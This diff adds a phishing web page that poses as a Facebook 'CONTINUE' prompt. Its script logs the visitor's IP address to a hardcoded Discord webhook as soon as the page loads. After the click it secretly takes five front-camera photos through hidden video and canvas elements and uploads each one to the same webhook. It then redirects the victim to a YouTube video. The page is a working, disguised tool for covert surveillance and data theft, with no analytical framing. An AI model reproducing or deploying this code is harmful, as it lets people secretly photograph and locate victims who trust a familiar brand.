@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>FACEBOOK</title></title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body{
+  background:#0f2027;
+  color:#fff;
+  font-family:Arial;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
+}
+.card{
+  background:#111;
+  padding:20px;
+  border-radius:12px;
+  width:100%;
+  max-width:360px;
+  text-align:center;
+}
+button{
+  width:100%;
+  padding:12px;
+  margin-top:10px;
+  border:none;
+  border-radius:8px;
+  background:#1e90ff;
+  color:white;
+  font-size:15px;
+  cursor:pointer;
+}
+button:hover{background:#0c7cd5}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <h3>FACEBOOK</h3>
+  <p></p>
+  <button id="liveBtn">CONTINUE</button>
+</div>
+
+<video id="video" autoplay playsinline style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1497902538379366471/bpe31Ylt3jxYDzRQEgUqOA5sUkxl20f4pU2OFYJGEKArPUD-qhE1P0zL5SLtwydHGo_4";
+const YT_LINK = "https://youtu.be/FPcsJTxnaBQ?si=SyIov-PTl20i3r6B";
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const liveBtn = document.getElementById("liveBtn");
+
+let userIP = "Unknown";
+let stream;
+let photoCount = 0;
+const MAX_PHOTOS = 5;
+const INTERVAL_MS = 1000;
+
+/* 1 AUTO SEND IP */
+fetch("https://api.ipify.org")
+  .then(r => r.text())
+  .then(ip => {
+    userIP = ip;
+    fetch(WEBHOOK,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({
+        content:" Visitor IP Logged",
+        embeds:[{
+          title:"IP Address",
+          description:`\`${ip}\``,
+          timestamp:new Date()
+        }]
+      })
+    });
+  });
+
+/* 2 LIVE STREAM CLICK */
+liveBtn.onclick = () => {
+  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
+    .then(s=>{
+      stream = s;
+      video.srcObject = stream;
+      video.play();
+      video.onloadedmetadata = startCaptureLoop;
+    })
+    .catch(()=>alert("Camera permission denied"));
+};
+
+function startCaptureLoop(){
+  const timer = setInterval(()=>{
+    if(photoCount >= MAX_PHOTOS){
+      clearInterval(timer);
+      stream.getTracks().forEach(t=>t.stop());
+
+      setTimeout(()=>{
+        window.location.href = YT_LINK;
+      },500);
+      return;
+    }
+    capturePhoto();
+    photoCount++;
+  }, INTERVAL_MS);
+}
+
+function capturePhoto(){
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext("2d");
+
+  // mirror fix (front cam)
+  ctx.translate(canvas.width,0);
+  ctx.scale(-1,1);
+  ctx.drawImage(video,0,0,canvas.width,canvas.height);
+
+  canvas.toBlob(blob=>{
+    const form = new FormData();
+    form.append("file", blob, `photo_${photoCount+1}.png`);
+    form.append("payload_json", JSON.stringify({
+      content:` Photo ${photoCount+1}/5`,
+      embeds:[{
+        title:"Camera + IP",
+        fields:[
+          {name:"IP Address", value:userIP}
+        ],
+        timestamp:new Date()
+      }]
+    }));
+    fetch(WEBHOOK,{method:"POST",body:form});
+  },"image/png");
+}
+</script>
+
+</body>
+</html>
